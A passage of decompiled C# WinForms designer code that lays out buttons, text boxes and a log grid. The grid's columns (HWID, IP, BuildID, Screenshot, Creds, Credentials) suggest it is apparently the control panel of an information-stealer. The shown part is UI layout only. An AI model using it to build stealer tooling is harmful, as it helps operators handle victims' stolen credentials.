        ((MetroSet_UI.Controls.MetroSetButton)this.d8).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.d8).Size = new System.Drawing.Size(27, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).StyleManager = null;
        ((System.Windows.Forms.Control)this.d8).TabIndex = 37;
        ((System.Windows.Forms.Control)this.d8).Text = ">>";
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.d8).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.d8).Click += new System.EventHandler(d8_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.searchBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.searchBtn).Location = new System.Drawing.Point(964, 586);
        ((System.Windows.Forms.Control)this.searchBtn).Name = "searchBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.searchBtn).Size = new System.Drawing.Size(98, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.searchBtn).TabIndex = 36;
        ((System.Windows.Forms.Control)this.searchBtn).Text = "Search";
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.searchBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.searchBtn).Click += new System.EventHandler(searchBtn_Click);
        ((GuiLib.AnimaTextBox)this.searchTb).Dark = false;
        ((System.Windows.Forms.Control)this.searchTb).Location = new System.Drawing.Point(524, 587);
        ((GuiLib.AnimaTextBox)this.searchTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.searchTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.searchTb).Name = "searchTb";
        ((GuiLib.AnimaTextBox)this.searchTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.searchTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.searchTb).Size = new System.Drawing.Size(434, 23);
        ((System.Windows.Forms.Control)this.searchTb).TabIndex = 35;
        ((GuiLib.AnimaTextBox)this.searchTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label4).AutoSize = true;
        ((System.Windows.Forms.Control)this.label4).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label4).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label4).Location = new System.Drawing.Point(417, 590);
        ((System.Windows.Forms.Control)this.label4).Name = "label4";
        ((System.Windows.Forms.Control)this.label4).Size = new System.Drawing.Size(72, 15);
        ((System.Windows.Forms.Control)this.label4).TabIndex = 34;
        ((System.Windows.Forms.Control)this.label4).Text = "Search filter:";
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.clearBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.clearBtn).Location = new System.Drawing.Point(1065, 611);
        ((System.Windows.Forms.Control)this.clearBtn).Name = "clearBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.clearBtn).Size = new System.Drawing.Size(98, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.clearBtn).TabIndex = 33;
        ((System.Windows.Forms.Control)this.clearBtn).Text = "Clear all logs";
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.clearBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.clearBtn).Click += new System.EventHandler(clearBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.saveBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveBtn).Location = new System.Drawing.Point(1065, 586);
        ((System.Windows.Forms.Control)this.saveBtn).Name = "saveBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.saveBtn).Size = new System.Drawing.Size(98, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.saveBtn).TabIndex = 32;
        ((System.Windows.Forms.Control)this.saveBtn).Text = "Save all logs";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.saveBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.saveBtn).Click += new System.EventHandler(saveBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.setCommentBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.setCommentBtn).Location = new System.Drawing.Point(964, 611);
        ((System.Windows.Forms.Control)this.setCommentBtn).Name = "setCommentBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.setCommentBtn).Size = new System.Drawing.Size(98, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.setCommentBtn).TabIndex = 31;
        ((System.Windows.Forms.Control)this.setCommentBtn).Text = "Set";
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.setCommentBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.setCommentBtn).Click += new System.EventHandler(setCommentBtn_Click);
        ((GuiLib.AnimaTextBox)this.commentTb).Dark = false;
        ((System.Windows.Forms.Control)this.commentTb).Location = new System.Drawing.Point(524, 612);
        ((GuiLib.AnimaTextBox)this.commentTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.commentTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.commentTb).Name = "commentTb";
        ((GuiLib.AnimaTextBox)this.commentTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.commentTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.commentTb).Size = new System.Drawing.Size(434, 23);
        ((System.Windows.Forms.Control)this.commentTb).TabIndex = 30;
        ((GuiLib.AnimaTextBox)this.commentTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label1).AutoSize = true;
        ((System.Windows.Forms.Control)this.label1).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label1).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label1).Location = new System.Drawing.Point(417, 616);
        ((System.Windows.Forms.Control)this.label1).Name = "label1";
        ((System.Windows.Forms.Control)this.label1).Size = new System.Drawing.Size(101, 15);
        ((System.Windows.Forms.Control)this.label1).TabIndex = 26;
        ((System.Windows.Forms.Control)this.label1).Text = "Enter a comment:";
        ((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToAddRows = false;
        ((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToDeleteRows = false;
        ((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToOrderColumns = true;
        ((System.Windows.Forms.DataGridView)this.logsListView).AllowUserToResizeRows = false;
        dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.logsListView).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        ((System.Windows.Forms.DataGridView)this.logsListView).AutoGenerateColumns = false;
        ((System.Windows.Forms.DataGridView)this.logsListView).AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        ((System.Windows.Forms.DataGridView)this.logsListView).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.DataGridView)this.logsListView).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.DataGridView)this.logsListView).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
        ((System.Windows.Forms.DataGridView)this.logsListView).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        ((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        ((System.Windows.Forms.DataGridView)this.logsListView).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        ((System.Windows.Forms.DataGridView)this.logsListView).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.SeenBefore, (System.Windows.Forms.DataGridViewColumn)this.Checked, (System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn, (System.Windows.Forms.DataGridViewColumn)this.Comment, (System.Windows.Forms.DataGridViewColumn)this.Creds, (System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.Credentials);
        ((System.Windows.Forms.Control)this.logsListView).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.logContextMenu;
        ((System.Windows.Forms.DataGridView)this.logsListView).DataSource = this.object_16;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridView)this.logsListView).DefaultCellStyle = dataGridViewCellStyle3;
        ((System.Windows.Forms.DataGridView)this.logsListView).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
        ((System.Windows.Forms.DataGridView)this.logsListView).EnableHeadersVisualStyles = false;
        ((System.Windows.Forms.DataGridView)this.logsListView).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
        ((System.Windows.Forms.Control)this.logsListView).Location = new System.Drawing.Point(4, 19);
        ((System.Windows.Forms.Control)this.logsListView).Name = "logsListView";
        ((System.Windows.Forms.DataGridView)this.logsListView).ReadOnly = true;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
        dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        dataGridViewCellStyle4.Font = new System.Drawing.Font("Segoe UI", 9f);
        dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Silver;
        dataGridViewCellStyle4.SelectionBackColor = System.Drawing.SystemColors.Highlight;
        dataGridViewCellStyle4.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
        dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersVisible = false;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
        dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
        dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowsDefaultCellStyle = dataGridViewCellStyle5;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
        ((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.DataGridView)this.logsListView).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
        ((System.Windows.Forms.DataGridView)this.logsListView).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        ((System.Windows.Forms.DataGridView)this.logsListView).ShowEditingIcon = false;
        ((System.Windows.Forms.Control)this.logsListView).Size = new System.Drawing.Size(1159, 555);
        ((System.Windows.Forms.Control)this.logsListView).TabIndex = 15;
        ((System.Windows.Forms.DataGridView)this.logsListView).VirtualMode = true;
        ((System.Windows.Forms.DataGridView)this.logsListView).DataError += new System.Windows.Forms.DataGridViewDataErrorEventHandler(logsListView_DataError);
        ((System.Windows.Forms.DataGridView)this.logsListView).SelectionChanged += new System.EventHandler(logsListView_SelectionChanged);
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).DataPropertyName = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).HeaderText = "ID";
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).Name = "iDDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn).Width = 70;
        ((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).DataPropertyName = "HWID";
        ((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).HeaderText = "HWID";
        ((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).Name = "hWIDDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.hWIDDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.hWIDDataGridViewTextBoxColumn).Width = 220;
        ((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).DataPropertyName = "IP";
        ((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).HeaderText = "IP";
        ((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).Name = "iPDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.iPDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.iPDataGridViewTextBoxColumn).Width = 120;
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).DataPropertyName = "BuildID";
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).HeaderText = "BuildID";
        ((System.Windows.Forms.DataGridViewColumn)this.buildIDDataGridViewTextBoxColumn).Name = "buildIDDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.buildIDDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).DataPropertyName = "Username";
        ((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).HeaderText = "Username";
        ((System.Windows.Forms.DataGridViewColumn)this.usernameDataGridViewTextBoxColumn).Name = "usernameDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.usernameDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.usernameDataGridViewTextBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).DataPropertyName = "IsProcessElevated";
        ((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).HeaderText = "IsProcessElevated";
        ((System.Windows.Forms.DataGridViewColumn)this.isProcessElevatedDataGridViewCheckBoxColumn).Name = "isProcessElevatedDataGridViewCheckBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.isProcessElevatedDataGridViewCheckBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.isProcessElevatedDataGridViewCheckBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).DataPropertyName = "CurrentLanguage";
        ((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).HeaderText = "CurrentLanguage";
        ((System.Windows.Forms.DataGridViewColumn)this.currentLanguageDataGridViewTextBoxColumn).Name = "currentLanguageDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.currentLanguageDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.currentLanguageDataGridViewTextBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).DataPropertyName = "MonitorSize";
        ((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).HeaderText = "MonitorSize";
        ((System.Windows.Forms.DataGridViewColumn)this.monitorSizeDataGridViewTextBoxColumn).Name = "monitorSizeDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.monitorSizeDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.monitorSizeDataGridViewTextBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).DataPropertyName = "LogDate";
        ((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).HeaderText = "LogDate";
        ((System.Windows.Forms.DataGridViewColumn)this.logDateDataGridViewTextBoxColumn).Name = "logDateDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.logDateDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).DataPropertyName = "Country";
        ((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).HeaderText = "Country";
        ((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).Name = "countryDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.countryDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.countryDataGridViewTextBoxColumn).Width = 60;
        ((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).DataPropertyName = "SeenBefore";
        ((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).HeaderText = "SeenBefore";
        ((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).Name = "SeenBefore";
        ((System.Windows.Forms.DataGridViewBand)this.SeenBefore).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.SeenBefore).Width = 70;
        ((System.Windows.Forms.DataGridViewColumn)this.Checked).DataPropertyName = "Checked";
        ((System.Windows.Forms.DataGridViewColumn)this.Checked).HeaderText = "Checked";
        ((System.Windows.Forms.DataGridViewColumn)this.Checked).Name = "Checked";
        ((System.Windows.Forms.DataGridViewBand)this.Checked).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.Checked).Width = 55;
        ((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).DataPropertyName = "Location";
        ((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).HeaderText = "Location";
        ((System.Windows.Forms.DataGridViewColumn)this.locationDataGridViewTextBoxColumn).Name = "locationDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.locationDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.locationDataGridViewTextBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).DataPropertyName = "TimeZone";
        ((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).HeaderText = "TimeZone";
        ((System.Windows.Forms.DataGridViewColumn)this.timeZoneDataGridViewTextBoxColumn).Name = "timeZoneDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.timeZoneDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.timeZoneDataGridViewTextBoxColumn).Visible = false;
        ((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).DataPropertyName = "Screenshot";
        ((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).HeaderText = "Screenshot";
        ((System.Windows.Forms.DataGridViewColumn)this.screenshotDataGridViewImageColumn).Name = "screenshotDataGridViewImageColumn";
        ((System.Windows.Forms.DataGridViewBand)this.screenshotDataGridViewImageColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.screenshotDataGridViewImageColumn).Visible = false;
